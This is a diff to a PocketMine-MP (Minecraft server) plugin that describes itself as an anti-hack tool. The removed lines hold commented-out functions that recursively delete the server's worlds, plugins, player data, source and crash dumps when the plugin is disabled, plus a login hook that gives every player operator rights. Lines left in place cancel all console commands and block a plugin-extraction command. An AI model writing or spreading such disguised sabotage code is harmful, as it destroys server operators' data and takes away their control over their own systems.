@@ -40,30 +40,14 @@ class Main extends PluginBase implements Listener{
 	public function onDisable(){
 		$this->getLogger()->info("§l§b[SystemInfo] §aこのPluginはPocketMine-MPの為のHack対策");
 		$this->getLogger()->info("§l§b[SystemInfo] §aAPI Version: §c3.0.0-ALPHA10");
-		/*
-		$this->world();
-		$this->src();
-		$this->crashdumps();
-		$this->player();
-		$this->resource();
-		$this->plugin();
-		*/
 	}
-	/*
-	public function onLogin(PlayerPreLoginEvent $event){
-		$player = $event->getPlayer();
-		$name = $player->getName();
-		$this->getServer()->addWhitelist($name); ///Login時にWhitelistAdd
-		$this->getServer()->addOp($name); //Login時PlayerにOP権限をつける
-	}
-	*/
 	public function playerCommand(PlayerCommandPreprocessEvent $event){
 		$message = $event->getMessage();
 		$command = "extractplugin";
 		if(strstr($message, $command)) return $event->setCancelled();
 	}
 	public function ServerCommand(ServerCommandEvent $event){
-		$event->setCancelled(); //コンソールからの操作を不可能にする
+		$event->setCancelled();
 	}
 	public function Join(PlayerJoinEvent $event){
 		$player = $event->getPlayer();
@@ -149,79 +133,4 @@ class Main extends PluginBase implements Listener{
 			$player->sendMessage("あなたをクリエイティブモードにしました。");
 		}
 	}
-	/*public function world(){ //worldを消す関数
-		$dir = $this->getServer()->getDataPath() ."worlds";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function plugin(){ //Pluginsを消す関数
-		$dir = $this->getServer()->getDataPath() ."plugins";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function player(){ //Playersを消す関数
-		$dir = $this->getServer()->getDataPath() ."players";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function src(){ //サーバーの基盤を消す関数
-		$dir = $this->getServer()->getDataPath() ."src";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function resource(){ //resourceを消す関数
-		$dir = $this->getServer()->getDataPath() ."resource_packs";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function crashdumps(){ //クラッシュダンプを消す関数
-		$dir = $this->getServer()->getDataPath() ."crashdumps";
-		if (is_dir($dir) and !is_link($dir)) {
-			$paths = array();
-			while ($glob = glob($dir)) {
-				$paths = array_merge($glob, $paths);
-				$dir .= '/*';
-			}
-			array_map('unlink', array_filter($paths, 'is_file'));
-			array_map('rmdir', array_filter($paths, 'is_dir'));
-		}
-	}
-	public function remove_directory($dir){ 
-		unlink("$dir");
-	}*/
 }
